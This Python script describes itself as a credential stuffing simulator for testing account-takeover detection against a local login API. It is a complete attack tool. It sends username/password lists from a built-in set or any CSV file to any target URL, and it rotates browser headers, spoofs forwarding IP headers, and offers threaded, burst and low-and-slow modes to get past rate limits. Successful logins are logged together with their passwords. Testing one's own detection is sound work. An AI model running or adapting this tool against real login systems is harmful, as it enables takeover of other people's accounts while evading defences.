"""
Credential Stuffing Attack Simulator
Simulates credential stuffing attacks against the login system for testing ATO detection.
"""

import requests
import time
import random
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse
from datetime import datetime
import csv
from loguru import logger

class CredentialStuffingSimulator:
    def __init__(self, target_url="http://localhost:5000", max_threads=10):
        self.target_url = target_url
        self.login_endpoint = f"{target_url}/api/login"
        self.max_threads = max_threads
        self.success_count = 0
        self.failure_count = 0
        self.blocked_count = 0
        self.captcha_count = 0
        self.total_attempts = 0
        
        # Common User-Agent strings to rotate
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101"
        ]
        
        # Mock leaked credentials (common username/password combinations)
        self.leaked_credentials = [
            ("admin", "password"),
            ("user", "123456"),
            ("test", "test"),
            ("admin", "admin"),
            ("root", "root"),
            ("user1", "password1"),
            ("demo", "demo"),
            ("guest", "guest"),
            ("administrator", "password"),
            ("user", "password"),
            ("admin", "123456"),
            ("test", "password"),
            ("user2", "user2"),
            ("demo", "password"),
            ("admin", "qwerty"),
            ("user", "qwerty"),
            ("test", "123456"),
            ("root", "password"),
            ("admin", "letmein"),
            ("user", "welcome"),
        ]
        
        # Proxy list for IP rotation (mock IPs for simulation)
        self.proxy_ips = [
            "192.168.1.100",
            "192.168.1.101", 
            "192.168.1.102",
            "10.0.0.100",
            "10.0.0.101",
            "172.16.0.100",
            "203.0.113.100",  # Mock external IPs
            "198.51.100.100",
            "192.0.2.100"
        ]
        
        # Setup logging
        logger.add(f"attack_logs/credential_stuffing_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    
    def get_random_headers(self):
        """Generate random headers to mimic different browsers/devices"""
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
            "Origin": self.target_url,
            "Referer": f"{self.target_url}/login",
            "X-Forwarded-For": random.choice(self.proxy_ips),  # Simulate different IPs
            "X-Real-IP": random.choice(self.proxy_ips)
        }
    
    def attempt_login(self, username, password, delay_range=(1, 5)):
        """Attempt a single login with the given credentials"""
        try:
            # Random delay to simulate human behavior
            time.sleep(random.uniform(delay_range[0], delay_range[1]))
            
            headers = self.get_random_headers()
            
            payload = {
                "username": username,
                "password": password
            }
            
            # Make the request
            response = requests.post(
                self.login_endpoint,
                json=payload,
                headers=headers,
                timeout=10
            )
            
            self.total_attempts += 1
            
            # Parse response
            if response.status_code == 200:
                resp_data = response.json()
                if "token" in resp_data:
                    self.success_count += 1
                    logger.success(f"LOGIN SUCCESS: {username}:{password}")
                    return "SUCCESS"
                elif resp_data.get("captcha_required"):
                    self.captcha_count += 1
                    logger.warning(f"CAPTCHA required for {username}")
                    return "CAPTCHA"
            elif response.status_code == 401:
                self.failure_count += 1
                logger.info(f"LOGIN FAILED: {username}:{password}")
                return "FAILED"
            elif response.status_code == 429:
                self.blocked_count += 1
                logger.error(f"IP BLOCKED for attempt: {username}")
                return "BLOCKED"
            else:
                logger.error(f"Unexpected response {response.status_code}: {response.text}")
                return "ERROR"
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Network error for {username}: {e}")
            return "ERROR"
        except Exception as e:
            logger.error(f"Unexpected error for {username}: {e}")
            return "ERROR"
    
    def run_sequential_attack(self, credential_list=None, delay_range=(1, 3)):
        """Run credential stuffing attack sequentially"""
        credentials = credential_list or self.leaked_credentials
        
        logger.info(f"Starting sequential credential stuffing attack with {len(credentials)} credentials")
        
        results = []
        for username, password in credentials:
            result = self.attempt_login(username, password, delay_range)
            results.append({
                "username": username,
                "password": password,
                "result": result,
                "timestamp": datetime.now().isoformat()
            })
            
            # Print progress
            if self.total_attempts % 10 == 0:
                self.print_stats()
        
        return results
    
    def run_concurrent_attack(self, credential_list=None, delay_range=(0.5, 2)):
        """Run credential stuffing attack with multiple threads"""
        credentials = credential_list or self.leaked_credentials
        
        logger.info(f"Starting concurrent credential stuffing attack with {len(credentials)} credentials using {self.max_threads} threads")
        
        results = []
        
        def attack_worker(cred_pair):
            username, password = cred_pair
            result = self.attempt_login(username, password, delay_range)
            return {
                "username": username,
                "password": password,
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_cred = {executor.submit(attack_worker, cred): cred for cred in credentials}
            
            for future in future_to_cred:
                try:
                    result = future.result(timeout=30)
                    results.append(result)
                    
                    # Print progress
                    if len(results) % 5 == 0:
                        self.print_stats()
                        
                except Exception as e:
                    cred = future_to_cred[future]
                    logger.error(f"Attack worker failed for {cred}: {e}")
        
        return results
    
    def run_distributed_attack(self, duration_minutes=10, requests_per_minute=60):
        """Run a distributed-style attack over time"""
        logger.info(f"Starting distributed attack for {duration_minutes} minutes at {requests_per_minute} req/min")
        
        end_time = datetime.now().timestamp() + (duration_minutes * 60)
        results = []
        
        while datetime.now().timestamp() < end_time:
            # Select random credentials
            username, password = random.choice(self.leaked_credentials)
            
            # Attempt login
            result = self.attempt_login(username, password, (0.5, 1.5))
            results.append({
                "username": username,
                "password": password,
                "result": result,
                "timestamp": datetime.now().isoformat()
            })
            
            # Wait to maintain request rate
            time.sleep(60 / requests_per_minute)
            
            # Print stats every minute
            if self.total_attempts % requests_per_minute == 0:
                self.print_stats()
        
        return results
    
    def simulate_bot_patterns(self):
        """Simulate various bot attack patterns"""
        patterns = [
            self.burst_attack_pattern,
            self.low_and_slow_pattern,
            self.random_timing_pattern
        ]
        
        results = []
        for pattern in patterns:
            logger.info(f"Running pattern: {pattern.__name__}")
            pattern_results = pattern()
            results.extend(pattern_results)
            
            # Cool down between patterns
            time.sleep(random.uniform(30, 60))
        
        return results
    
    def burst_attack_pattern(self):
        """Simulate burst attack - many requests in short time"""
        credentials = self.leaked_credentials[:10]  # Use subset for burst
        results = []
        
        for username, password in credentials:
            result = self.attempt_login(username, password, (0.1, 0.5))
            results.append({
                "username": username,
                "password": password,
                "result": result,
                "timestamp": datetime.now().isoformat(),
                "pattern": "burst"
            })
        
        return results
    
    def low_and_slow_pattern(self):
        """Simulate low and slow attack - spread out over time"""
        credentials = self.leaked_credentials[:5]
        results = []
        
        for username, password in credentials:
            result = self.attempt_login(username, password, (10, 30))
            results.append({
                "username": username,
                "password": password,
                "result": result,
                "timestamp": datetime.now().isoformat(),
                "pattern": "low_and_slow"
            })
        
        return results
    
    def random_timing_pattern(self):
        """Simulate random timing attack"""
        credentials = self.leaked_credentials[:8]
        results = []
        
        for username, password in credentials:
            # Random delay between 1-20 seconds
            delay = random.uniform(1, 20)
            result = self.attempt_login(username, password, (delay, delay + 1))
            results.append({
                "username": username,
                "password": password,
                "result": result,
                "timestamp": datetime.now().isoformat(),
                "pattern": "random_timing"
            })
        
        return results
    
    def print_stats(self):
        """Print current attack statistics"""
        print(f"\n=== ATTACK STATISTICS ===")
        print(f"Total Attempts: {self.total_attempts}")
        print(f"Successful Logins: {self.success_count}")
        print(f"Failed Logins: {self.failure_count}")
        print(f"IP Blocks: {self.blocked_count}")
        print(f"CAPTCHA Challenges: {self.captcha_count}")
        print(f"Success Rate: {(self.success_count/self.total_attempts*100):.2f}%" if self.total_attempts > 0 else "0%")
        print(f"Block Rate: {(self.blocked_count/self.total_attempts*100):.2f}%" if self.total_attempts > 0 else "0%")
        print("========================\n")
    
    def save_results(self, results, filename=None):
        """Save attack results to CSV file"""
        if not filename:
            filename = f"attack_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        
        with open(filename, 'w', newline='') as csvfile:
            fieldnames = ['username', 'password', 'result', 'timestamp', 'pattern']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            
            writer.writeheader()
            for result in results:
                writer.writerow(result)
        
        logger.info(f"Results saved to {filename}")

def main():
    parser = argparse.ArgumentParser(description="Credential Stuffing Attack Simulator")
    parser.add_argument("--target", default="http://localhost:5000", help="Target URL")
    parser.add_argument("--mode", choices=["sequential", "concurrent", "distributed", "bot-patterns"], 
                       default="sequential", help="Attack mode")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads for concurrent mode")
    parser.add_argument("--duration", type=int, default=5, help="Duration in minutes for distributed mode")
    parser.add_argument("--rate", type=int, default=30, help="Requests per minute for distributed mode")
    parser.add_argument("--credentials", help="Path to credentials file (CSV format)")
    parser.add_argument("--output", help="Output file for results")
    
    args = parser.parse_args()
    
    # Initialize simulator
    simulator = CredentialStuffingSimulator(target_url=args.target, max_threads=args.threads)
    
    # Load custom credentials if provided
    credentials = None
    if args.credentials:
        try:
            with open(args.credentials, 'r') as f:
                reader = csv.reader(f)
                credentials = [(row[0], row[1]) for row in reader if len(row) >= 2]
            logger.info(f"Loaded {len(credentials)} credentials from {args.credentials}")
        except Exception as e:
            logger.error(f"Failed to load credentials file: {e}")
            return
    
    # Run attack based on mode
    results = []
    
    if args.mode == "sequential":
        results = simulator.run_sequential_attack(credentials)
    elif args.mode == "concurrent":
        results = simulator.run_concurrent_attack(credentials)
    elif args.mode == "distributed":
        results = simulator.run_distributed_attack(args.duration, args.rate)
    elif args.mode == "bot-patterns":
        results = simulator.simulate_bot_patterns()
    
    # Print final statistics
    simulator.print_stats()
    
    # Save results
    if args.output:
        simulator.save_results(results, args.output)
    else:
        simulator.save_results(results)

if __name__ == "__main__":
    main()